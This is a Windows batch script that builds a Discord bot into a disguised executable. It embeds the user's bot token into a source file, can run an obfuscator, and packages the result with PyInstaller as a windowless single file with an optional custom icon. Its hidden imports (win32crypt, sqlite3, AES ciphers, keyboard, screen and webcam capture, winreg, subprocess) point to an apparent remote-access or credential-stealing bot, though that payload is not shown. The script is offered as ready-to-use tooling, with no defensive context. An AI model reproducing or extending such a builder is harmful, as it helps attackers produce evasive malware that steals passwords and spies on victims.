@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

title Builder

where python >nul 2>&1
if errorlevel 1 (
    echo ❌ Python is not installed or not found in PATH.
    echo Please install Python from https://python.org and add it to PATH, or run this script from a console where Python is available.
    pause
    exit /b 1
)

python -c "import sys; print('Using Python:', sys.executable); print('Version:', sys.version.splitlines()[0])"
echo.

set /p "TOKEN=Enter your Discord bot token (will be written temporarily): "
if "!TOKEN!"=="" (
    echo No token provided.
    pause
    exit /b 1
)

set /p "EXE_NAME=Enter the name for your executable (without .exe): "
if "!EXE_NAME!"=="" set "EXE_NAME=DiscordBot"

set "ICON_OPTION="
set /p "USE_ICON=Do you want to use a custom .ico file? (y/n): "
if /i "!USE_ICON!"=="y" (
    set /p "ICON_PATH=Enter path to the .ico file: "
    if exist "!ICON_PATH!" (
        set "ICON_OPTION=--icon=!ICON_PATH!"
    ) else (
        echo Icon file not found, continuing without icon.
        set "ICON_OPTION="
    )
)

echo Creating bot file with token...

if not exist "oney.py" (
    echo Cannot find oney.py in current folder. Place your bot source oney.py next to this builder.
    pause
    exit /b 1
)

echo import sys > temp_builder.py
echo import os >> temp_builder.py
echo. >> temp_builder.py
echo if len(sys.argv) ^< 2: >> temp_builder.py
echo     print('Error: No token provided') >> temp_builder.py
echo     sys.exit(1) >> temp_builder.py
echo. >> temp_builder.py
echo token = sys.argv[1] >> temp_builder.py
echo. >> temp_builder.py
echo try: >> temp_builder.py
echo     with open('temp_token.py', 'w', encoding='utf-8') as f: >> temp_builder.py
echo         f.write('TOKEN = ' + repr(token) + '\n') >> temp_builder.py
echo. >> temp_builder.py
echo     with open('temp_token.py', 'r', encoding='utf-8') as f1: >> temp_builder.py
echo         token_content = f1.read() >> temp_builder.py
echo. >> temp_builder.py
echo     with open('oney.py', 'r', encoding='utf-8') as f2: >> temp_builder.py
echo         main_content = f2.read() >> temp_builder.py
echo. >> temp_builder.py
echo     with open('bot_with_token.py', 'w', encoding='utf-8') as out: >> temp_builder.py
echo         out.write(token_content + '\n' + main_content) >> temp_builder.py
echo. >> temp_builder.py
echo     print('Successfully created bot_with_token.py') >> temp_builder.py
echo. >> temp_builder.py
echo except Exception as e: >> temp_builder.py
echo     print('Error creating combined file:', e) >> temp_builder.py
echo     sys.exit(1) >> temp_builder.py

python temp_builder.py "!TOKEN!"

if errorlevel 1 (
    echo Failed to create combined bot file.
    call :cleanup
    pause
    exit /b 1
)

del temp_builder.py

set "AS_SOURCE=bot_with_token"
set /p "USE_OBF=Do you want to obfuscate? (y/n): "
if /i "!USE_OBF!"=="y" (
    if exist obf.py (
        echo Running obfuscator...
        python obf.py
        if errorlevel 1 (
            echo Obfuscation failed.
            call :cleanup
            pause
            exit /b 1
        )
        if exist obfuscated_oney.py (
            set "AS_SOURCE=obfuscated_oney"
        ) else (
            echo obfuscated_oney.py not present after obf.py; falling back to bot_with_token.py
            set "AS_SOURCE=bot_with_token"
        )
    ) else (
        echo obf.py not found; skipping obfuscation.
    )
)

if not exist ".venv\Scripts\activate.bat" (
    echo Creating virtual environment...
    python -m venv .venv
    if errorlevel 1 (
        echo Failed to create virtualenv.
        call :cleanup
        pause
        exit /b 1
    )
)

call .venv\Scripts\activate.bat

echo Upgrading pip...
python -m pip install --upgrade pip setuptools wheel >nul 2>&1

if exist requirements.txt (
    echo Installing requirements from requirements.txt...
    python -m pip install -r requirements.txt
) else (
    echo No requirements.txt found; continuing.
)

echo Installing PyInstaller...
python -m pip install --upgrade pyinstaller >nul 2>&1

echo Checking for SQLite support...
python -c "import sys, os; exec('try:\n import _sqlite3\n with open(\"sqlite_path.tmp\", \"w\") as f: f.write(os.path.abspath(_sqlite3.__file__))\n print(\"SQLite support found\")\nexcept:\n print(\"SQLite support not found or built-in\")')" 2>nul

set "SQLITE_PYD="
if exist sqlite_path.tmp (
    set /p SQLITE_PYD=<sqlite_path.tmp
    del sqlite_path.tmp
    echo Found _sqlite3 at: !SQLITE_PYD!
)

set "HIDDEN_ARGS=--hidden-import=discord --hidden-import=discord.ext --hidden-import=discord.ext.commands --hidden-import=aiohttp --hidden-import=websockets --hidden-import=yarl --hidden-import=multidict --hidden-import=async_timeout --hidden-import=attrs --hidden-import=idna --hidden-import=nacl --hidden-import=pyautogui --hidden-import=pyperclip --hidden-import=keyboard --hidden-import=sqlite3 --hidden-import=_sqlite3 --hidden-import=asyncio --hidden-import=io --hidden-import=socket --hidden-import=subprocess --hidden-import=os --hidden-import=time --hidden-import=ctypes --hidden-import=webbrowser --hidden-import=threading --hidden-import=json --hidden-import=datetime --hidden-import=shutil --hidden-import=sys --hidden-import=glob --hidden-import=ssl --hidden-import=certifi --hidden-import=random --hidden-import=string --hidden-import=base64 --hidden-import=codecs --hidden-import=argparse --hidden-import=re --hidden-import=struct --hidden-import=urllib3 --hidden-import=pyaes --hidden-import=textwrap --hidden-import=lzma --hidden-import=marshal --hidden-import=logging --hidden-import=win32crypt --hidden-import=traceback --hidden-import=zlib --hidden-import=winreg --hidden-import=requests --hidden-import=tempfile --hidden-import=cryptography --hidden-import=cryptography.hazmat --hidden-import=cryptography.hazmat.primitives --hidden-import=cryptography.hazmat.primitives.ciphers --hidden-import=cryptography.hazmat.primitives.ciphers.aead --hidden-import=pathlib --hidden-import=cv2 --hidden-import=numpy --hidden-import=PIL.Image --hidden-import=PIL.ImageGrab --hidden-import=urllib.request --hidden-import=zipfile --hidden-import=platform --hidden-import=flask"

echo Building executable with PyInstaller...
echo.

set "PYINST_CMD=python -m PyInstaller --onefile --windowed --name !EXE_NAME! !HIDDEN_ARGS! !AS_SOURCE!.py"

if not "!ICON_OPTION!"=="" (
    set "PYINST_CMD=!PYINST_CMD! !ICON_OPTION!"
)

if not "!SQLITE_PYD!"=="" (
    set "PYINST_CMD=!PYINST_CMD! --add-binary=!SQLITE_PYD!:."
)

echo Command: !PYINST_CMD!
echo.

!PYINST_CMD!
if errorlevel 1 (
    echo PyInstaller build failed.
    call :cleanup
    pause
    exit /b 1
)

echo.
echo ================================
echo    BUILD COMPLETE!
echo ================================
echo.
echo ✅ Executable created: dist\!EXE_NAME!.exe
echo.

if exist "dist\!EXE_NAME!.exe" (
    echo Opening executable location...
    explorer "dist"
) else (
    echo Warning: Executable not found at expected location.
)

call :cleanup
call deactivate 2>nul
pause
endlocal
exit /b 0

:cleanup
if exist temp_token.py del temp_token.py 2>nul
if exist bot_with_token.py del bot_with_token.py 2>nul
if exist obfuscated_oney.py del obfuscated_oney.py 2>nul
if exist sqlite_path.tmp del sqlite_path.tmp 2>nul
if exist temp_builder.py del temp_builder.py 2>nul
exit /b 0



